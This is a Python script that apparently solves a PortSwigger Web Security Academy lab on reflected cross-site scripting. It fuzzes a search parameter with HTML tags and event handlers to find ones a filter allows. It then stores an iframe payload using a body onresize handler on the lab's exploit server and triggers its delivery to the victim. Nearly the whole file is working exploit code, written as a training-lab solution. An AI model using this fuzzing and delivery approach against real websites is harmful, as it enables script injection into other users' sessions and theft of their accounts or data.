#!/usr/bin/env python3
from requests import get, post
from rich import console

# Template lab
template_server = 'https://ID_LAB.web-security-academy.net'
server = ''

# Template exploit server
template_exploit = 'https://exploit-ID_EXPLOIT.exploit-server.net'
exploit = ''

# vulnerable_endpoint = ''
# Tags and events provided by https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
tags, events = [], []
tags_events_permitted = []


def set_ips():
	global server, exploit
	server = input('Insert the lab\'s id\n').strip()
	exploit = input('Insert the id of the exploit server (Only the id!)\n').strip()

	server = template_server.replace('ID_LAB', server)
	exploit = template_exploit.replace('ID_EXPLOIT', exploit)

def setup():
	# Retriving all the available tags
	with open('./code/res/tags.txt') as t:
		for tag in t:
			tags.append(tag.strip())
	# Retriving all the available events
	with open('./code/res/events.txt') as e:
		for event in e:
			events.append(event.strip())

def analyze_tags_events():
	tags_permitted = []
	for t in tags:
		payload = f'<{t}>'
		res = get(server, {'search': payload}, timeout=10)
		if res.status_code == 200:
			tags_permitted.append(t)
			# Add progress update

	for t in tags_permitted:
		for e in events:
			payload = f'<{t} {e}=1>'
			res = get(server, {'search': payload}, timeout=10)
			if res.status_code == 200:
				tags_events_permitted.append((t, e))
				# Add progress update

def print_results():
	print('Those are the permitted tags and events:\n')
	print(tags_events_permitted)

def ask_to_complete_challenge():
	a = input('Do you want to complete the challenge? (Y/N)\n')
	accept = ['yes', 'y']
	if a.lower() in accept:
		return True
	return False

def send_to_exploit():
	template_iframe = f"""
	<iframe src='{server}/?search=%3Cbody+onresize%3Dprint%28%29%3E' onload="this.style.width='100%'" width="50%" height="50%"></iframe>
	"""
	res = post(exploit, {'urlIsHttps':'on', 'responseFile':'/exploit', 'responseHead': 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8', 'responseBody':template_iframe, 'formAction':'STORE'})

	if res.status_code != 200:
		print('Something went wrong when delivering the payload on the exploit server')
		return
	
	res = get(f'{exploit}/deliver-to-victim')

	if res.status_code != 200:
		print('Something went wrong when delivering the exploit to the victim')
		return
	
	print('Everything was delivered. Challenge complete!')

def main():
	setup()
	set_ips()
	analyze_tags_events()
	print_results()
	if not ask_to_complete_challenge():
		exit(0)
	send_to_exploit()

if __name__ == '__main__':
	main()